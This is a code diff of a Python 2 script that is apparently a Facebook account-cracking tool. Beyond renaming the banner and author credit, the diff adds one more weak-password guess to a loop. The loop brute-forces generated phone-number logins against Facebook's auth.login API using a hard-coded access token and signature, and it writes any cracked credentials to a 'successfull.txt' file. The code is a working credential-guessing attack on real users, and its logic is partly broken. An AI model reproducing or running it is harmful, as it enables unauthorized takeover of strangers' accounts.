@@ -48,33 +48,16 @@ def cb():
     os.system('clear')
         
         
-logo =""".                 -/+osssso+/-`
-             `/sdNMMMMMMMMMMMMMMNds/`
-          .odMMMMMMMMMMMMMMMMMMMMMMMMdo.
-        :hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh:
-      -dMMMNmMMMMMMMNNNNNNNNNNMMMMMMMmNMMMd-
-    `sMNNs-oMMMMNNNNNNNNNNNNNNNNNNMMMMo-sNNMs
-   `dM+s-:sMMMNNNNNNMMNMNNMNMMNNNNNNMMMs-:s+Md`
-  `mho.h/:dMNNMMMNMMNmNoso-dmNMMNMMMNNMd:/d`ohm`
-  hs//::oMMNMMMMNMMMMNMmmo+NNMMMMNMMMMNMNo:-+:yh
- /M--y+:hMNNNNNNNMMMNNMMmmMMNMMMMNNNNNNNMh:oy.:M:
- dd+./.hMNMMMMMNMMMNNNNNooNNNNNMMMNMMMMMNMy./.odh
-`M-m-/yyMNMMMMMNMMMMNMNdssdNMNMMMMNMMMMMNMyy/-m-N
-`M:-ho`NMNNNNNNNNNmho-sN:/Ms-shmNNNNNNNNNMm`sh-/M`
-`Mh`+ sdMNMMMMMh`     NMosMN     `dMMMMMNMdo`/`hN
- d/h/.m.MNMMMMM+      yM--My      oMMMMMNM.m`/h/h
- /d`/ss mNNNNNN-      `d.-h`      -NNNNNNd ss/`d:
-  hm/`+ d:mNMMN                    NMMNd:h`+`/mh
-  `doss/++.mNNh                    hNNm`o//ssod`
-   `ds.:+y-:sso                    osy:-y+--sd`
-     sMy+/:./+                      +/.:/+yMs
-      -dyo/////.```            ```./////ohh-
-        :hMhoosss/`            `/sssoohMh:
-          .ohysoos.            .soosyh+`
-             `/sdN`            `Nds/`
+logo ="""_    _                          _____        __ _
+ | |  | |                        / ____|      / _| |
+ | |__| | __ _ _ __ ___   __ _  | (___   ___ | |_| |___      ____ _ _ __ ___
+ |  __  |/ _` | '_ ` _ \ / _` |  \___ \ / _ \|  _| __\ \ /\ / / _` | '__/ _ \
+ | |  | | (_| | | | | | | (_| |  ____) | (_) | | | |_ \ V  V / (_| | | |  __/
+ |_|  |_|\__,_|_| |_| |_|\__,_| |_____/ \___/|_|  \__| \_/\_/ \__,_|_|  \___|
+   
 \033[1;97m  
-\033[1;97m      WELCOM BACK
-\033[1;97m  TOOL BY MOHAMMED SABAH
+\033[1;97m       WELCOM BACK
+\033[1;97m  THE ONE TOOL CHANEEL HAMA IT
 """
 CorrectUsername = 'H4M4'
 CorrectPassword = 'CRACKER'
@@ -86,7 +69,7 @@ while loop == 'true':
     if username == CorrectUsername:
         password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1m PASSWORD: ')
         if password == CorrectPassword:
-            print '\x1b[1;92m[\xe2\x9c\x93] TOOL SUCCESSFULLY LOGGED  '
+            print '\x1b[1;92m[\xe2\x9c\x93] TOOL WAS OPENED  '
             time.sleep(3)
             loop = 'false'
         else:
@@ -141,7 +124,7 @@ def action():
     xxx = str(len(id))
     psb('[\xe2\x9c\x93] ALL NUMBERS: ' + xxx)
     time.sleep(0.1)
-    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;97m CRACK FACEBOOK WAS STARTED...')
+    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;97m KURDISH TOOL BY H4M4 CRACKER...')
     time.sleep(0.1)
     psb('[!] TO STOP TOOL USE  [CTRL + Z]')
     time.sleep(0.5)
@@ -203,8 +186,8 @@ def action():
                 cps.close()
                 cpb.append(c + user + pass3)
             else:
-                pass4 = '112233445566'
-            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6" )
+                pass4 = '112233112233'
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass4 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
@@ -212,13 +195,29 @@ def action():
                 okb.write(k + c + user + '>>>' + pass4 + '\n')
                 okb.close()
                 oks.append(c + user + pass4)
-                
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass4 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass4 + '\n')
                 cps.close()
                 cpb.append(c + user + pass4)
+            else:
+                pass5 = '112233445566'
+            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + k + c + user + '&locale=en_US&password=' + pass5 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6" )
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;93m[SUCCESSFULL]\x1b[1;93m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass5 + '\n')
+                okb.close()
+                oks.append(c + user + pass5)
+                
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;97m[CHECKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass5 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass5 + '\n')
+                cps.close()
+                cpb.append(c + user + pass5)
         except:
             pass
 
